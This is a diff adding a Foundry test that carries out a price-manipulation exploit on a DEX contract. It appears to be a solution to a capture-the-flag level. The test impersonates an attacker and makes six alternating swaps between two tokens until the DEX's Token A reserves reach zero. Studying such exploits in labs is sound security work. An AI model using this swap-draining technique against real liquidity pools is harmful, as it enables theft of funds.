@@ -30,5 +30,28 @@ contract DexTest is Test {
     }
 
     
+    function testExploit() public {
+    vm.startPrank(attacker);
+
+    // Approve Dex to spend attacker's tokens
+    dex.approve(address(dex), type(uint256).max);
+
+    console.log("Initial Dex Token A balance:", swappabletokenA.balanceOf(address(dex)));
+    
+    // Exploit steps
+    dex.swap(address(swappabletokenA), address(swappabletokenB), 10);  // Swap 10 A -> B
+    dex.swap(address(swappabletokenB), address(swappabletokenA), 20);  // Swap 20 B -> A
+    dex.swap(address(swappabletokenA), address(swappabletokenB), 24);  // Swap 24 A -> B
+    dex.swap(address(swappabletokenB), address(swappabletokenA), 30);  // Swap 30 B -> A
+    dex.swap(address(swappabletokenA), address(swappabletokenB), 41);  // Swap 41 A -> B
+    dex.swap(address(swappabletokenB), address(swappabletokenA), 45);  // Final swap to drain A
+
+    console.log("Final Dex Token A balance:", swappabletokenA.balanceOf(address(dex)));
+    
+    // Verify all Token A reserves are drained
+    assertEq(swappabletokenA.balanceOf(address(dex)), 0, "Token A reserves not drained");
+
+    vm.stopPrank();
+}
 
 }
